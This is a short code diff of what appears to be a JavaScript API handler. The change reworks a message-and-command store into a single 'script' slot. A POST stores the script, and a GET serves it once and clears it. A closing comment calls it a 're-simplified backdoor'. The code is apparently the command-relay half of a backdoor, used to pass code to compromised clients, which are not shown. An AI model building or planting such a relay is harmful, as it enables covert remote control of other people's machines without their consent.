@@ -1,19 +1,14 @@
-let message = null;
-let command = null;
+let script = "";
 
 export default function handler(req, res) {
     if (req.method === "POST") {
-        if (req.body.message) message = req.body.message;
-        if (req.body.command) command = req.body.command;
-        return res.status(200).json({ status: "ok" });
+        script = req.body.script || "";
+        return res.status(200).json({ status: "stored" });
     }
 
     if (req.method === "GET") {
-        // Return current message & command
-        const data = { message, command };
-        // Clear them after reading
-        message = null;
-        command = null;
-        return res.status(200).json(data);
+        const temp = script;
+        script = ""; // clear after one fetch
+        return res.status(200).send(temp);
     }
-}
+} //re-simplified backdoor hahahhaha
